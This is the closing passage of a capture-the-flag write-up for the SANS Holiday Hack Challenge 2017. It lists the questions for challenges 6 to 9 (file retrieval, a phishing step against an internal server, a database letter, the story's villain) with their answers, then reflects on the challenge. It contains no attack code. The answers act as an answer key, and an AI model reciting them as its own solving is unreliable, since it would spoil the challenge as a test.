6. `The North Pole engineering team has introduced an Elf as a Service (EaaS.  platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?`

The title of the first page of *The Great Book* is **The Dreaded
Inter-Dimensional Tornadoes**.

7. `Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\\GreatBookPage7.pdf. What does The Great Book page describe?`

The seventh page of *The Great Book* gives us details regarding the Witches of
Oz, their power, and their neutrality during the Great Schism.

8. `Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?`

The letter was written by the Wizard of Oz, Santa's good friend.

9. `Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?`

The villain causing the giant snowball problem is Glinda, the "Good" Witch.
She cast a spell on Bumble to make him throw giant snowballs, in order to
create an all-out war between Elves and Munchkins. This would have allowed her
to make a profit, by selling spells to both sides of the war.

Conclusion
~~~~~~~~~~

Once again, the SANS staff outdid themselves and gave us an amazing Christmas
challenge. I thought implementing client-side attacks, such as XSS or phishing
attacks was a nice touch. It's also great that designed the challenge to that
people would have to pivot to an internal network. Overall, it kind of reminded
me of when I took my OSCP exam/lab.

As usual, see you next year!

[EDIT 2018-03-15]

This write-up received an `honorable mention from the SANS team <https://holidayhackchallenge.com/2017/winners_answers.html>`__.
Even though I didn't win any prize, I'm still super honored to receive this
recognition. Thanks to the SANS team for organizing this challenge, and
special thanks to Jerry Salinas for reviewing my write-up!

